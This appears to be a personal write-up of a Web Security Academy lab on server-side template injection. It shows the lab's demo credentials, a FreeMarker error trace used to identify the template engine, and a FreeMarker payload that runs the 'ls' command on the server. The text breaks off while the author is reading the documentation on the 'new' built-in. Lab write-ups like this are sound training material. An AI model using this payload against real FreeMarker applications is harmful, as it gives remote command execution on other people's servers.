# Description

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials:

`content-manager:C0nt3ntM4n4g3r`

# Solution

In product description editor, try to corrupt variables name, and triggrer errors.

```java
Hurry! Only FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> product.stoc [in template "freemarker" at line 5, column 18] ---- Tip: It's the step after the last dot that caused this error, not those before it. ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${product.stoc} [in template "freemarker" at line 5, column 16] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.visit(Environment.java:337) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23) [Return](https://0a11007104e1e19e826e47c900b60063.web-security-academy.net/)
```

It is java, FTL Free Maker template enginge

In hack tricks found payload to execute commands

```js
${"freemarker.template.utility.Execute"?new()("ls")}
```

but ideally i neede to read it from documentation, but it is not so easy

In FAQ page in documentation i could find key word "security"

![](Attachments/Pasted%20image%2020240530213554.png)

and there is row about `new()`

The `new` built-in 

